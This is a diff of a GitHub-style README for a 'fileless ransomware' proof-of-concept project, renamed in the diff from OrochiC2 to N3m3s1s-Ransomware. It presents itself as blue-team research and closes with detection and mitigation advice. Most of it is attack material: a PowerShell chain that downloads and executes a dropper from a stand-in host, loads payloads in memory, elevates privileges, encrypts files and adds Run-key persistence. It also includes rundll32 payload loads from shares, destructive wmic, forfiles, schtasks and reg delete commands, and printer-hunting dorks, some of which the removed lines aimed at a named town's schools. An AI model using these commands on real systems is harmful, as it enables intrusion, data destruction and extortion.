@@ -1,6 +1,6 @@
 
 
-# OrochiC2: Fileless Malware Research (PoC)
+# N3m3s1s-Ransomware: Fileless Ransomware Simulation & Detection Research (PoC)
 
 > **Warning**  
 > This project is **strictly for educational, authorized research, and penetration testing in isolated lab environments**.  
@@ -9,7 +9,8 @@
 
 ---
 
-<img src="https://github.com/user-attachments/assets/08948de4-0ae9-4863-8b74-0454bb3a1446" width="200">
+![nemesis_millar](https://github.com/user-attachments/assets/89c34e28-ed0c-47bf-a9a1-73ace104e532)
+
 
 ---
 
@@ -21,7 +22,7 @@
   - [Prerequisites](#prerequisites)
   - [Build Instructions](#build-instructions)
 - [Technical Overview](#technical-overview)
-- [Attack Chain Example (PowerShell)](#attack-chain-example-powershell)
+- [Simulated Attack Chain (PowerShell)](#simulated-attack-chain-powershell)
 - [Reconnaissance and LOLBins](#reconnaissance-and-lolbins)
   - [Google Dork Examples](#google-dork-examples)
   - [Living Off the Land Binaries (LOLBins)](#living-off-the-land-binaries-lolbins)
@@ -38,42 +39,52 @@
 
 ## About
 
-**Yamata-no-OrochiC2** is a proof-of-concept (PoC) research project simulating advanced fileless malware and C2 (Command & Control) techniques for Windows 10/11. It leverages "Living Off the Land" tactics, built-in system binaries (LOLBins), and public exploits to demonstrate stealthy attacks without touching disk.
+**NSFW-Ransomware** is a proof-of-concept (PoC) project that simulates advanced fileless ransomware and command-and-control (C2) techniques on Windows 10/11. It demonstrates the abuse of trusted Windows system components ("Living Off the Land Binaries" or LOLBins) to execute ransomware operations entirely in memory, with minimal or no disk footprint.
 
 **Primary Objectives:**
-- Enable cybersecurity professionals and students to study fileless malware behavior.
-- Support detection engineering, blue team training, and security research.
-- Demonstrate the abuse of trusted Windows components for stealthy attacks.
+- Enable cybersecurity professionals and students to study fileless ransomware behaviors.
+- Support blue team training, threat hunting, and detection engineering.
+- Demonstrate how attackers can abuse built-in Windows binaries for stealthy, hard-to-detect attacks.
+
+---
+
+## Features
+
+- **Fileless execution:** Simulates ransomware operations using PowerShell, LOLBins, and in-memory payloads.
+- **Privilege escalation & credential access:** Demonstrates exploitation with no reliance on custom binaries on disk.
+- **Lateral movement & impact:** Simulates propagation and destructive actions using only native tools.
+- **Detection bypass:** Designed to evade traditional endpoint protection by avoiding disk writes.
+- **Detection research:** Provides blue teams with realistic attack scenarios for defensive testing.
 
 ---
 
 ## Technical Overview
 
-This project focuses on simulating fileless ransomware and C2 attack chains, including:
+This project focuses on simulating fileless ransomware attack chains, including:
 
-- **Initial Access:** LOLBins download and execute payloads in memory.
-- **Privilege Escalation:** Print Spooler & HiveNightmare exploitation.
+- **Initial Access:** Downloading and executing payloads in memory via LOLBins (e.g., PowerShell, rundll32.exe).
+- **Privilege Escalation:** Exploiting Print Spooler or HiveNightmare vulnerabilities.
 - **Credential Access:** Dumping credentials from memory (e.g., LSASS).
-- **Lateral Movement:** Native Windows protocols for network spread.
-- **Impact:** Encrypting/wiping files, disabling recovery.
+- **Lateral Movement:** Using Windows network protocols for spreading.
+- **Impact:** Encrypting or wiping files, disabling recovery mechanisms, all filelessly.
 
-> **Note:** All techniques are for blue team and detection research purposes only.
+> **Note:** All techniques are provided exclusively for blue team research and detection engineering.
 
 ---
 
-## Attack Chain Example (PowerShell)
+## Simulated Attack Chain (PowerShell)
 
 A staged simulation using only built-in Windows tools:
 
 ```powershell
-# Initial Access: Load dropper
-IEX(New-Object Net.WebClient).DownloadString("http://malicious.com/dropper.ps1")
+# Initial Access: Load dropper in-memory (no files written to disk)
+IEX(New-Object Net.WebClient).DownloadString("http://malicious.local/dropper.ps1")
 
 # Decode and load in-memory payload
-$bytes = [System.Convert]::FromBase64String("[Base64Payload]") 
+$bytes = [System.Convert]::FromBase64String("[Base64Payload]")
 [System.Reflection.Assembly]::Load($bytes)
 
-# Privilege Escalation
+# Privilege Escalation (Example)
 Start-Process powershell -Args "-ExecutionPolicy Bypass -File C:\Temp\elevate.ps1" -Verb RunAs
 
 # Credential Access
@@ -93,7 +104,7 @@ foreach ($file in $files) {
   Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
 }
 
-# Persistence
+# Persistence (Fileless via registry)
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
 ```
 
@@ -103,28 +114,28 @@ Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ra
 
 ### Google Dork Examples
 
-Use search engines (SHODAN, FOFA) to find vulnerable printer services:
+Use search engines (SHODAN, FOFA) to find potentially vulnerable services:
 
 ```
-inurl:"/hp/device/this.LCDispatcher" "Moberly"
-intitle:"Printer Status" "Moberly Public Schools"
-intitle:"Web Image Monitor" inurl:"/wim" "Moberly"
-inurl:"/printer/main.html" "City of Moberly"
-intitle:"Web Jetadmin" "Moberly"
-inurl:"/printers/" "Moberly"
-intitle:"Konica Minolta" inurl:"/wcd/" "Moberly"
-intitle:"PaperCut MF" "Moberly"
+inurl:"/hp/device/this.LCDispatcher"
+intitle:"Printer Status"
+intitle:"Web Image Monitor"
+inurl:"/printer/main.html"
+intitle:"Web Jetadmin"
+inurl:"/printers/"
+intitle:"Konica Minolta"
+intitle:"PaperCut MF"
 ```
 
 ### Living Off the Land Binaries (LOLBins)
 
-Trusted Windows binaries often abused for stealthy attacks:
+Abusing trusted Windows binaries for stealthy, fileless attacks:
 
 ```cmd
 rundll32.exe \\10.10.X.X\shared\payload.dll,ReflectEntry
 ```
 
-Attackers use `rundll32.exe`, `regsvr32.exe`, `powershell.exe` to execute payloads filelessly from network shares.
+Attackers may use `rundll32.exe`, `regsvr32.exe`, `powershell.exe`, etc., to execute payloads in-memory from network shares or encoded scripts.
 
 ---
 
@@ -132,7 +143,7 @@ Attackers use `rundll32.exe`, `regsvr32.exe`, `powershell.exe` to execute payloa
 
 ### Fileless Dropper Embedding
 
-**Goal:** Hide payloads inside benign files, extract and execute with native tools.
+**Goal:** Hide payloads inside benign files (e.g., images), then extract and execute fully in memory.
 
 1. **Embed Payload:**
     ```bash
@@ -146,7 +157,7 @@ Attackers use `rundll32.exe`, `regsvr32.exe`, `powershell.exe` to execute payloa
 
 ### Reflective DLL Injection
 
-Loads a malicious DLL directly in memory, evading disk forensics.
+Loads a malicious DLL directly into memory, evading disk forensics.
 
 ```cmd
 rundll32.exe \\10.10.X.X\share\nsfw.dll,ReflectEntry
@@ -186,7 +197,7 @@ Demonstrate ransomware/wiper activity using only native binaries:
   `wmic process call create "cmd.exe /c del /f /s /q C:\Users\*.docx"`
 - **forfiles.exe** — Timed wipe:  
   `forfiles /p C:\ /s /d -2 /c "cmd /c del /q @file"`
-- **schtasks.exe** — Scheduled kill:  
+- **schtasks.exe** — Scheduled wipe:  
   `schtasks /create /tn "Wipe" /tr "cmd /c del /f /q C:\*.xls" /sc once /st 23:59`
 - **reg.exe** — Registry destruction:  
   `reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f`
@@ -200,33 +211,35 @@ Demonstrate ransomware/wiper activity using only native binaries:
 ### Detection
 
 - **Sysmon + Sigma Rules:**
-  - Monitor `rundll32.exe` and other LOLBins loading non-system DLLs.
-  - Watch for abnormal use of `certutil.exe`, `regsvr32.exe`, `mshta.exe`.
-  - Track unauthorized shadow volume access.
+  - Monitor for LOLBins (e.g., `rundll32.exe`, `regsvr32.exe`, `certutil.exe`) executing unexpected DLLs/scripts.
+  - Watch for unusual use of PowerShell and encoded/obfuscated commands.
+  - Track unauthorized access or deletion of shadow volumes.
 - **SIEM Correlation (ELK/Splunk):**
-  - Alert on execution from network shares.
-  - Parent/child process anomalies (e.g., `explorer.exe` spawning `rundll32.exe`).
-  - Suspicious encoded PowerShell/CMD commands.
+  - Alert on execution from network shares or suspicious parent/child process chains (e.g., `explorer.exe` spawning `rundll32.exe`).
+  - Detect encoded PowerShell or CMD commands.
+- **EDR/XDR Solutions:**
+  - Use behavioral detections for in-memory execution and reflective DLL injection.
 
 ### Mitigation
 
-- Disable Print Spooler where unnecessary:
+- **Disable unnecessary services:**  
     ```cmd
     Stop-Service -Name Spooler -Force
     Set-Service -Name Spooler -StartupType Disabled
     ```
-- Apply all security patches, especially for Print Spooler and Hive ACL vulnerabilities.
-- Restrict LOLBins via AppLocker or Windows Defender Application Control (WDAC).
-- Deploy EDR/XDR solutions capable of detecting in-memory attacks and reflective loading.
+- **Patch vulnerabilities:** Apply security updates for Windows components (especially Print Spooler, Hive ACL, etc.).
+- **Restrict LOLBins:** Use AppLocker or Windows Defender Application Control (WDAC) to limit use of scripting engines and LOLBins.
+- **Network segmentation:** Restrict access to administrative shares and sensitive network locations.
+- **Regular backups:** Maintain offline and immutable backups.
 
 ---
 
 ## Legal Disclaimer
 
-> All content, code, and techniques in this repository are provided solely for educational and authorized security research.  
-> Any unauthorized use, distribution, or deployment is strictly prohibited.  
-> Use responsibly and always comply with applicable laws and regulations.  
-> **The authors bear NO liability for misuse.**
+> All code, documentation, and techniques in this repository are provided for educational and authorized security research only.  
+> **Any unauthorized use, distribution, or deployment is strictly prohibited.**  
+> You are solely responsible for ensuring all actions are legal in your jurisdiction.  
+> **The authors assume NO liability for misuse.**
 
 ---
 
